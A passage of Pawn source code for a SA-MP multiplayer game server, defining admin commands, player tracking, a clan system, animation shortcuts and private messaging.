    if(Finding[id] == 1) return SendClientMessage(playerid,COLOR_LIGHTRED,"Player Already being found");
	if(playerid == id) return SendClientMessage(playerid,COLOR_LIGHTRED,"You Cannot Find your self.");
	if(PlayerInfo[playerid][Level] >= 2)
	{
		GetPlayerName(id,pname,sizeof(pname));
		format(str,sizeof(str),"You are now finding %s - they are marked on your map!",id);
    	SendClientMessage(playerid, COLOR_WHITE,str);
		SetPlayerMarkerForPlayer(playerid,id,0xFF0000FF);
  		findtimer[playerid] = SetTimerEx("Trace", 1000*5/*5secs*/, true, "ii",playerid, id);
    	Finding[id] = 1;
	}
	else
	{
	    SendClientMessage(playerid,COLOR_LIGHTRED,"You are not a admin member !.");
	}
	return 1;
}

CMD:cfind(playerid,params[]) // Cancels the marker
{
	new id,str[128];
	new pname[MAX_PLAYER_NAME+1];
	CMDMessageToAdmins(playerid,"CFIND");
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /canclefindplayer [playerid]");
	if(Finding[id] == 0) return SendClientMessage(playerid,COLOR_LIGHTRED,"Player Not being found");
	GetPlayerName(id,pname,sizeof(pname));
	format(str,sizeof(str),"You have stopped finding %s - they have been removed from your map!",id);
	SendClientMessage(playerid, COLOR_WHITE,str);
 	KillTimer(findtimer[playerid]);
	SetPlayerMarkerForPlayer(playerid,id,0xFFFFFF00);
	Finding[id] = 0;
	return 1;
}


forward Trace(playerid, targetid);
public Trace(playerid, targetid)
{
SetPlayerMarkerForPlayer(playerid,targetid,0xFFFFFF00);
SetPlayerMarkerForPlayer(playerid,targetid,0xFF0000FF);
return 1;
}

//===================================================================================================
//========================Gift System

//===================================Admin Area======================
CMD:aarea(playerid, params[])
	return cmd_aareacmds(playerid, params);

CMD:aareacmds(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 6)
{
    SendClientMessage(playerid,0x0080FFFF,"_____| Admin Area V0.9 |_____");
	SendClientMessage(playerid,0xFF0000FF,"/adminarea |-{FFFFFF}Teleports you to the Admin Area ");
	SendClientMessage(playerid,0xFF0000FF,"/maingate |-{FFFFFF}Opens Main Gate ");
	SendClientMessage(playerid,0xFF0000FF,"/cabingate |-{FFFFFF}Opens Gate No F");
	SendClientMessage(playerid,0xFF0000FF,"/meeetgate |-{FFFFFF}Opens Gate No E");
 	SendClientMessage(playerid,0x0080FFFF,"_________________________________");
 	CMDMessageToAdmins(playerid,"AAREACMDS");
    }
    else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

CMD:adminarea(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 2)
{
	SetPlayerPos(playerid,2513.62817, -1594.70166, 1012.90350);
	SetPlayerFacingAngle(playerid,131.3587);
	SendClientMessage(playerid,0xFFFF00FF,"You have teleported to the Admin Area");
	CMDMessageToAdmins(playerid,"ADMINAREA");

    }
    else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}


CMD:meetgate(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 6)
{
	MoveObject(meetinggate,2498.5798,-1612.6508,1011.2485,2.0,0.00000,0.00000,0.00000);
	SendClientMessage(playerid,0x80FF00FF,"Meeting Room Gate is now openning.");
	SetTimer("MeetingGateClose",7000,0);
    }
    else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

CMD:cabingate(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 6)
{
	MoveObject(cabingate,2521.8098,-1603.0918,1011.2485,2.0,0.0000,0.0000,90.0000);
	SendClientMessage(playerid,0x80FF00FF,"Cabin Gate is now openning.");
	SetTimer("CabinGateClose",7000,0);
    }
    else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

CMD:maingate(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 6)
{
	MoveObject(maingate,2501.9539, -1603.0918, 1011.2485,2.0,0.0000,0.0000,90.0000);
	SendClientMessage(playerid,0x80FF00FF,"Main Gate is now openning.");
	SetTimer("MainGateClose",7000,0);
    }
    else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}




//==============================Clan system============================
    CMD:clancreate(playerid, params[])
    {
    	if(PlayerInfo[playerid][Level] >= 6)
		{
            if(group[playerid][gid] != -1) return SendClientMessage(playerid, 0xFF0000, "Leave your clan with {FFFFFF}/clanleave{FF0000} before creating a new one!");
            if(strlen(params) > 49 || strlen(params) < 3) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/clancreate{FF0000} (Group name 3-50 characters)!");
            if(IsGroupTaken(params)) return SendClientMessage(playerid, 0xFF0000, "Group name is already in use!");
            CreateGroup(params, playerid);
	 	}
            return 1;
    }

    CMD:clanleave(playerid, params[])
    {
            if(group[playerid][gid] == -1) return SendClientMessage(playerid, 0xFF0000, "You are not in a clan to leave one!");
            LeaveGroup(playerid, 0);
            return 1;
    }

    CMD:claninvite(playerid, params[])
    {
            if(group[playerid][order] != 1) return SendClientMessage(playerid, 0xFF0000, "You are not the leader of the clan, you cannot invite people!");
            new cid;
            if(isnull(params)) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/claninvite{FF0000} (playerid)");
            cid = strval(params);
            if(!IsPlayerConnected(cid)) return SendClientMessage(playerid, 0xFF0000, "Player Is not connected!");
            if(group[cid][gid] == group[playerid][gid]) return SendClientMessage(playerid, 0xFF0000, "Player Is already in your clan!");
            if(group[cid][invited] == group[playerid][gid]) return SendClientMessage(playerid, 0xFF0000, "Player has already been invited to your clan!");
            if(group[cid][attemptjoin] == group[playerid][gid]) return GroupJoin(cid, group[playerid][gid]);
            group[cid][invited] = group[playerid][gid];
            new string[125], pname[24];
            GetPlayerName(playerid, pname, 24);
            format(string, sizeof(string), "You have been invited to join clan {FFFFFF}%s(%d){FFCC66} by {FFFFFF}%s(%d). /clanjoin %d", groupinfo[group[playerid][gid]][grname], group[playerid][gid], pname, playerid, group[playerid][gid]);
            SendClientMessage(cid, 0xFFCC66, string);
            GetPlayerName(cid, pname, 24);
            format(string, sizeof(string), "You have invited {FFFFFF}%s(%d){FFCC66} to join your clan!", pname, cid);
            SendClientMessage(playerid, 0xFFCC66, string);
            return 1;
    }

    CMD:clanleader(playerid, params[])
    {
            if(group[playerid][order] != 1) return SendClientMessage(playerid, 0xFF0000, "You are not the leader of the clan, you cannot change the leader!");
            new cid;
            if(isnull(params)) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/clanleader{FF0000} (playerid)");
            cid = strval(params);
            if(!IsPlayerConnected(cid)) return SendClientMessage(playerid, 0xFF0000, "Player Is not connected!");
            if(cid == playerid)  return SendClientMessage(playerid, 0xFF0000, "You are already group leader, silly.");
            if(group[playerid][gid] != group[cid][gid]) return SendClientMessage(playerid, 0xFF0000, "Player Is not in your group!");
            ChangeMemberOrder(group[playerid][gid], 1);
            group[playerid][order] = GroupMembers(group[playerid][gid]);
            return 1;
    }

    CMD:clanjoin(playerid, params[])
    {
            if(group[playerid][gid] != -1) return SendClientMessage(playerid, 0xFF0000, "You are already in a group! Leave your current one before joining another one!");
            new grid;
            if( (isnull(params) && group[playerid][invited] != -1 ) || ( strval(params) == group[playerid][invited] && group[playerid][invited] != -1) ) return GroupJoin(playerid, group[playerid][invited]);
            if(isnull(params)) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/clanjoin{FF0000} (groupid)");
            grid = strval(params);
            if(!groupinfo[grid][active]) return SendClientMessage(playerid, 0xFF0000, "The clan you have tried to join doesn't exist!");
            group[playerid][attemptjoin] = grid;
            new string[125], pname[24];
            GetPlayerName(playerid, pname, 24);
            format(string, sizeof(string), "You have requested to join clan %s(ID:%d)", groupinfo[grid][grname], grid);
            SendClientMessage(playerid, 0xFFCC66, string);
            format(string, sizeof(string), "{FFFFFF}%s(%d) {FFCC66}has requested to join your clan. Type /claninvite %d to accept", pname, playerid, playerid);
            SendMessageToLeader(grid, string);
            return 1;
    }

    CMD:clankick(playerid, params[])
    {
            if(group[playerid][order] != 1) return SendClientMessage(playerid, 0xFF0000, "You are not the leader of a clan, you cannot kick!");
            new cid;
            if(isnull(params)) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/clankick{FF0000} (playerid)");
            cid = strval(params);
            if(!IsPlayerConnected(cid)) return SendClientMessage(playerid, 0xFF0000, "Player Is not connected!");
            if(cid == playerid)  return SendClientMessage(playerid, 0xFF0000, "You cannot kick yourself, silly.");
            if(group[playerid][gid] != group[cid][gid]) return SendClientMessage(playerid, 0xFF0000, "Player Is not in your clan!");
            LeaveGroup(cid, 1);
            return 1;
    }

    CMD:gm(playerid, params[])
    {
            if(group[playerid][gid] == -1) return SendClientMessage(playerid, 0xFF0000, "You are not in a clan, you cannot clan message!");
            if(isnull(params)) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/gm{FF0000} (message)");
            new pname[24], string[140+24];
            GetPlayerName(playerid, pname, 24);
            format(string, sizeof(string), "[CLAN]%s(%d): %s", pname, playerid, params);
            SendMessageToAllGroupMembers(group[playerid][gid], string);
            return 1;
    }
    
    CMD:clans(playerid,params[]) {
		if(PlayerInfo[playerid][Level] >= 2)
		{
    		SendClientMessage(playerid,0x0080FFFF,"____________________| CLAN LIST |____________________");
			SendClientMessage(playerid,C_LBLUE,"Rapid Action Force |-{FFFFFF}CLAN ID [0]");
			SendClientMessage(playerid,C_LBLUE,"Delta Force           |-{FFFFFF}CLAN ID [1]");
//			SendClientMessage(playerid,C_LBLUE,"EMPTY  |-{FFFFFF}EMPTY");
//			SendClientMessage(playerid,C_LBLUE,"EMPTY  |-{FFFFFF}EMPTY");
//			SendClientMessage(playerid,C_LBLUE,"EMPTY  |-{FFFFFF}EMPTY");
 			SendClientMessage(playerid,0x0080FFFF,"______________________________________________________");
    	}
    	else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}


    CMD:clanlist(playerid, params[])
    {
        if(isnull(params) && group[playerid][gid] == -1) return SendClientMessage(playerid, 0xFF0000, "Usage: {FFFFFF}/clanlist{FF0000} (group)");
        if(isnull(params))
            {
                    DisplayGroupMembers(group[playerid][gid], playerid);
                    return 1;
            }
   		new grid = strval(params);
     	if(!groupinfo[grid][active]) return SendClientMessage(playerid, 0xFF0000, "The clan ID you have entered is not active!");
      	DisplayGroupMembers(grid, playerid);
       	return 1;
    }

    CMD:clans0(playerid, params[])
    {
        ListGroups(playerid);
        return 1;
    }


    CMD:cleave(playerid, params[])
            return cmd_clanleave(playerid, params);

    CMD:ccreate(playerid, params[])
            return cmd_clancreate(playerid, params);

    CMD:cinvite(playerid, params[])
            return cmd_claninvite(playerid, params);

    CMD:cleader(playerid, params[])
            return cmd_clanleader(playerid, params);

    CMD:cjoin(playerid, params[])
            return cmd_clanjoin(playerid, params);

    CMD:ckick(playerid, params[])
            return cmd_clankick(playerid, params);

    CMD:cchat(playerid, params[])
            return cmd_gm(playerid, params);

    CMD:clist(playerid, params[])
            return cmd_clanlist(playerid, params);

//======================================================================
CMD:credits(playerid,params[])
{
    ShowPlayerDialog(playerid, 802, DIALOG_STYLE_MSGBOX, ""cred"COD-Real World At War 2 Credits", ""cgreen"Credits:\n\nScripted by Perfect_Boy\nServer Owned And Hosted by Perfect_Boy\nBeta Tester: [XP]Sumeeth\n------------------------------\n\nScript Made by Perfect_Boy\n\nMaps Made By Jake a.k.a MeGaTroN, and CJS\n\nLead Scripter - Perfect_Boy\nScripting Assistance - Mex_Ivanov, JRockie, "cred"Not allowed to Scam And Sell Script\n\n\nCall Of Duty : Real World At War 2 V10.9.2 ", "Okay", "Back");
 	return 1;
}

CMD:anims(playerid, params[])
{
	SCM(playerid,-1,"Anims");
	SCM(playerid,-1,"/Handsup | /Drunk | /Bomb | /Getarrested | /Laugh | /Robman");
	SCM(playerid,-1,"/Crossarms | /Lay | /Hide | /Vomit | /Eat | /Wave | /Taichi | /Piss");
	SCM(playerid,-1,"/Deal | /Crack | /Smokem | /Smokef | /Sit | /Chat | /Dance | /Fu");
    return true;
}

CMD:handsup(playerid, params[]) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);

CMD:cellin(playerid, params[]) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);

CMD:cellout(playerid, params[]) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);

CMD:drunk(playerid, params[]) return AnimLoopPlayer(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);

CMD:bomb(playerid, params[]) return	ClearAnimations(playerid),AnimPlayer(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);

CMD:getarrested(playerid, params[]) return AnimLoopPlayer(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1); // Gun Arrest

CMD:laugh(playerid, params[]) return AnimPlayer(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0); // Laugh

CMD:lookout(playerid, params[]) return AnimPlayer(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0); // Rob Lookout

CMD:piss(playerid, params[]) return SetPlayerSpecialAction(playerid, 68);

CMD:robman(playerid, params[]) return AnimLoopPlayer(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0); // Rob

CMD:crossarms(playerid, params[]) return AnimLoopPlayer(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1); // Arms crossed

CMD:lay(playerid, params[]) return AnimLoopPlayer(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0); // Lay down

CMD:hide(playerid, params[]) return AnimLoopPlayer(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0); // Taking Cover

CMD:vomit(playerid, params[]) return AnimPlayer(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0); // Vomit BAH!

CMD:eat(playerid, params[]) return AnimPlayer(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0); // Eat Burger

CMD:wave(playerid, params[]) return  AnimLoopPlayer(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0); // Wave

CMD:slapass(playerid, params[]) return AnimPlayer(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0); // Ass Slapping

CMD:deal(playerid, params[]) return AnimPlayer(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0); // Deal Drugs

CMD:crack(playerid, params[]) return AnimLoopPlayer(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0); // Dieing of Crack

CMD:smokem(playerid, params[]) return AnimLoopPlayer(playerid,"SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Smoke

CMD:smokef(playerid, params[]) return AnimLoopPlayer(playerid, "SMOKING", "F_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Female Smoking

CMD:sit(playerid, params[]) return AnimLoopPlayer(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0); // Sit

CMD:chat(playerid, params[]) return AnimPlayer(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);

CMD:fu(playerid, params[]) return AnimPlayer(playerid,"PED","fucku",4.0,0,0,0,0,0);

CMD:taichi(playerid, params[]) return AnimLoopPlayer(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);

CMD:chairsit(playerid, params[]) return AnimLoopPlayer(playerid,"BAR","dnk_stndF_loop",4.0,1,0,0,0,0);

CMD:dance(playerid, params[])
{
	new dancestyle;
 	if(!sscanf(params, "d", dancestyle))
	{
		if(dancestyle == 1) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		else if(dancestyle == 2) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		else if(dancestyle == 3) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		else if(dancestyle == 4) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
		else GameTextForPlayer(playerid,"~r~Invalid Dance-id~n~~w~JikyBot: Usage:~y~/Dance (1-4)", 3500, 3);
		return true;
	}
	else return GameTextForPlayer(playerid,"~w~JikyBot: Usage:~y~/Dance (1-4)", 3500, 3);
}

stock AnimPlayer(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	ApplyAnimation(playerid,
					animlib,
					animname,
					Speed,
					looping,
					lockx,
					locky,
					lockz,
					lp);
	return true;
}

stock AnimLoopPlayer(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
    IsPlayerUsingAnims[playerid] = 1;
    ApplyAnimation(playerid,
					animlib,
					animname,
					Speed,
					looping,
					lockx,
					locky,
					lockz,
					lp);
	GameTextForPlayer(playerid, "~w~PRESS ~r~ANY KEY ~w~TO STOP ANIM", 3000, 3);
   	return true;
}

stock StopAnimLoopPlayer(playerid)
{
	IsPlayerUsingAnims[playerid] = 0;
    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
    return true;
}

stock AnimPreloadForPlayer(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
	return true;
}
CMD:l(playerid, params[])
	return cmd_s(playerid, params);

CMD:s(playerid,params[]) {
if(isnull(params)) return SendClientMessage(playerid, -1, "JikyBot: Usage:/s [text] to talk to nearest person");
new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
new string[128], Float:x, Float:y, Float:z;
GetPlayerPos(playerid, x, y, z);
format(string, sizeof(string), ""COL_WHITE"[SAY][%s]: %s", Name, params[0]);
new str[128], adminstr[128];
format(str, sizeof(str),"[SAY]%s: %s", Name, params[0]);
printf("%s", string);
format(adminstr, sizeof(adminstr),">> [SAY]%s: %s",GetName(playerid),params[0]);
MessageTo4(grey, adminstr);
foreach(Player, i)
{
if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,5.0, x, y, z) ) SendClientMessage(i, RED, string);
}
return 1;
}
forward HighLight(playerid);
public HighLight(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	if(PlayerInfo[playerid][blipS] == 0) { SetPlayerColor(playerid, 0xFF0000AA); PlayerInfo[playerid][blipS] = 1; }
	else { SetPlayerColor(playerid, 0x33FF33AA); PlayerInfo[playerid][blipS] = 0; }
	return 0;
}

public PMLog(string[])
{
    new pm[128]; // Creates a new string
    format(pm, sizeof(pm), "%s\n", string); // Formats the string;
    new File:hFile; // Creates a new variable with type File
    hFile = fopen("/LOGS/pm.log", io_append); // Opens the Log File
    fwrite(hFile, pm); // Writes the log
    fclose(hFile); // Closes file
}
//===================== [ ZCMD Commands ]=======================================
CMD:pm(playerid, params[])
{
   new str[128], str2[128], id, adminstr[128];
   if(sscanf(params,"ds[128]", id, str2)) return SendClientMessage(playerid, red,"JikyBot: Usage:/pm [id] [message]");
   if(IsPlayerConnected(id))
   {
	   if(id != playerid)
	   {
		   if(DND[id] == 0)
		   {
		   		format(str, sizeof(str),"PM to [%d]%s:"cred" %s", id, PlayerName2(id), str2);
		   		SendClientMessage(playerid, yellow, str);
		   		format(str, sizeof(str),"PM from [%d]%s:"cred" %s", playerid, PlayerName2(playerid), str2);
		   		SendClientMessage(id, C_CYAN, str);
		   		#if defined IRCENABLED
		   		format(str, sizeof(str),"PM from [%d]%s:"cred" %s", playerid, PlayerName2(playerid), str2);
		   		IRC_GroupSay(gGroupID, IRC_ADMINCHANNEL, str);
		   		#endif
		   		
		   		format(adminstr, sizeof(adminstr),"PM from %s[%d] to %s[%d]: %s", PlayerName2(playerid), playerid, PlayerName2(id), id, str2);
		   		PlayerPlaySound(id,1085,0.0,0.0,0.0);
		   		MessageTo4(grey, adminstr);
		   		LastPm[id] = playerid;
		   }
		   else return SendClientMessage(playerid, red,"That player is in DND[do not disturb] mode! Ask him in main chat for /dnd, then retry");
	   }
	   else return SendClientMessage(playerid, red,"You cannot PM yourself, Use any other player's ID");
   }
   else return SendClientMessage(playerid, red,"Player is not connected Right Now");
   return 1;
}

CMD:spree(playerid,params[])
{
	new player1,playername[MAX_PLAYER_NAME];
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);
	if(IsPlayerConnected(player1))
	{
	    GetPlayerName(player1, playername, sizeof(playername));
 		new str[144];
 		format(str, sizeof(str),"%s is on a killing spree of: %d kills! | Session Kills: %d!", playername, Streak[playerid], Skills[playerid]);
		SendClientMessage(playerid, blue, str);
	}
	else return SendClientMessage(playerid, red, "Player Isn't Online!");
	return 1;
}

CMD:streak(playerid,params[])
{
	 return cmd_spree(playerid, params);
}

CMD:rpm(playerid, params[])
{
   new str[128], str2[128], adminstr[128];
   if(sscanf(params,"s[128]", str2)) return SendClientMessage(playerid, red,"JikyBot: Usage:/rpm [message]");
   new id = LastPm[playerid];
   if(IsPlayerConnected(id))
   {
	   if(DND[id] == 0)
	   {
            format(str, sizeof(str),"PM to [%d]%s:"cred" %s", id, PlayerName2(id), str2);
	   		SendClientMessage(playerid, yellow, str);
	   		format(str, sizeof(str),"PM from [%d]%s"cred": %s", playerid, PlayerName2(playerid), str2);
	   		SendClientMessage(id, yellow, str);
	   		SendClientMessage(id, -1,"Use "cblue"/rpm [message] "cyellow"to reply to this PM");
	   		PlayerPlaySound(id,1085,0.0,0.0,0.0);
	   		format(str, sizeof(str),"PM from [%d]%s:"cred" %s", playerid, PlayerName2(playerid), str2);
	   		IRC_GroupSay(gGroupID, IRC_ADMINCHANNEL, str);
	   		format(adminstr, sizeof(adminstr),"PM from %s[%d] to %s[%d]: %s", PlayerName2(playerid), playerid, PlayerName2(id), id, str2);
	   		MessageToAdmins(grey, adminstr);
	   		LastPm[LastPm[playerid]] = playerid;
	   }
	   else return SendClientMessage(playerid, red,"That player is in do not disturb mode!");
   }
   else return SendClientMessage(playerid, red,"Player is not connected");
   return 1;
}
CMD:dnd(playerid, params[])
{
   if(DND[playerid] == 0)
   {
	   DND[playerid] = 1;
	   SendClientMessage(playerid, yellow,"DND Has Been "cgreen"Enable.");
   }
   else if(DND[playerid] == 1)
   {
	   DND[playerid] = 0;
	   SendClientMessage(playerid, yellow,"DND Has Been "cred"Disable.");
   }
   return 1;
}
CMD:helpme(playerid, params[])
{
	new str[128], Name1[MAX_PLAYER_NAME];
	if(sscanf(params,"s[128]", str))
	{
	 SendClientMessage(playerid, red,"CORRECT JikyBot: Usage:/helpme [text]");
	 return 1;
	}
	GetPlayerName(playerid, Name1, sizeof(Name1));
	format(str, sizeof(str),"{00FFFF}[HELP MSG From %s]:{00FFF0} %s",Name1, str);
	MessageToTwice(red, str);
	format(str, sizeof(str),"{00FFFF}[SERVER MSG Use /apm %d]:{00FFF0} To Reply To Him",playerid);
	MessageToTwice(red, str);
	SendClientMessage(playerid, yellow,"Your Request has been sent to online Administrators, Please Wait for their Reply.");
	return 1;
}

CMD:giveweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/giveweapon [playerid] [weapon id/weapon name] [ammo]");
		new player1 = strval(tmp), weap, ammo, WeapName[32], string[128];
		if(!strlen(tmp3) || !IsNumeric(tmp3) || strval(tmp3) <= 0 || strval(tmp3) > 99999) ammo = 500; else ammo = strval(tmp3);
		if(!IsNumeric(tmp2)) weap = GetWeaponIDFromName(tmp2); else weap = strval(tmp2);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        	if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"JikyBot: Invalid weapon ID");
			CMDMessageToAdmins(playerid,"GIVEWEAPON");
			GetWeaponName(weap,WeapName,32);
			format(string, sizeof(string), "You have given \"%s\" a %s (%d) with %d rounds of ammo", PlayerName2(player1), WeapName, weap, ammo); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has given you a %s (%d) with %d rounds of ammo", PlayerName2(playerid), WeapName, weap, ammo); SendClientMessage(player1,blue,string); }
   			return GivePlayerWeapon(player1, weap, ammo);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:sethealth(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/sethealth [playerid] [amount]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "JikyBot: Invaild health amount");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETHEALTH");
			format(string, sizeof(string), "You have set \"%s's\" health to '%d", pName(player1), health); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your health to '%d'", pName(playerid), health); SendClientMessage(player1,blue,string); }
   			return SetPlayerHealth(player1, health);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setarmour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setarmour [playerid] [amount]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "JikyBot: Invaild health amount");
		new player1 = strval(tmp), armour = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETARMOUR");
			format(string, sizeof(string), "You have set \"%s's\" armour to '%d", pName(player1), armour); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your armour to '%d'", pName(playerid), armour); SendClientMessage(player1,blue,string); }
   			return SetPlayerArmour(player1, armour);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setcash [playerid] [amount]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETCASH");
			format(string, sizeof(string), "You have set \"%s's\" cash to '$%d", pName(player1), cash); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your cash to '$%d'", pName(playerid), cash); SendClientMessage(player1,blue,string); }
			ResetPlayerMoney(player1);
			SaveToFile("Admin",string);
   			return GivePlayerMoney(player1, cash);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setping(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
 		if(!strlen(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setping [ping]   Set to 0 to disable");
	    new string[128], ping = strval(params);
		ServerInfo[MaxPing] = ping;
		CMDMessageToAdmins(playerid,"SETPING");
		new file[256]; format(file,sizeof(file),"ladmin/config/Config.sav");
		dini_IntSet(file,"MaxPing",ping);
		for(new i = 0; i <= MAX_PLAYERS; i++) if(IsPlayerConnected(i)) PlayerPlaySound(i,1057,0.0,0.0,0.0);
		if(ping == 0) format(string,sizeof(string),"Administrator %s has disabled maximum ping", PlayerName2(playerid), ping);
		else format(string,sizeof(string),"Administrator %s has set the maximum ping to %d", PlayerName2(playerid), ping);
		return SendClientMessageToAll(blue,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
